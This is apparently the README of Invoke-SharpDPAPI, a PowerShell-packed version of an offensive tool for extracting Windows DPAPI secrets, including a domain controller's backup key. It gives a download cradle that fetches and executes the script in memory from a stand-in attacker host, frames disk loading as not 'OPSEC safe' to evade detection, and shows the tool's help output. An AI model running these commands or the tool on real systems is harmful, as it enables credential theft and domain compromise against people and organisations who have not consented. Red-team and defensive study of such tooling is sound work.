# Invoke-SharpDPAPI

Build with Visual Studio by using the folowing repository: https://github.com/GhostPack/SharpDPAPI

Used the following script to pack: https://gist.github.com/Mayfly277/2e5f34a7e7f70798d1f19c0c35f9fa0e

## Usage

Load the tool into memory

```bash
# From Disk but it is not OPSEC safe
PS C:\> . .\Invoke-SharpDPAPI.ps1

# Or load with a download cradle
iex (new-object system.net.webclient).downloadstring("http://attacker.ip/Invoke-SharpDPAPI.ps1")
```

## Execute

```bash
PS C:\workdir> Invoke-SharpDPAPI -Command ""

  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.12.0



Retrieve a domain controller's DPAPI backup key, optionally specifying a DC and output file:

  SharpDPAPI backupkey [/nowrap] [/server:SERVER.domain] [/file:key.pvk]
[....]
```
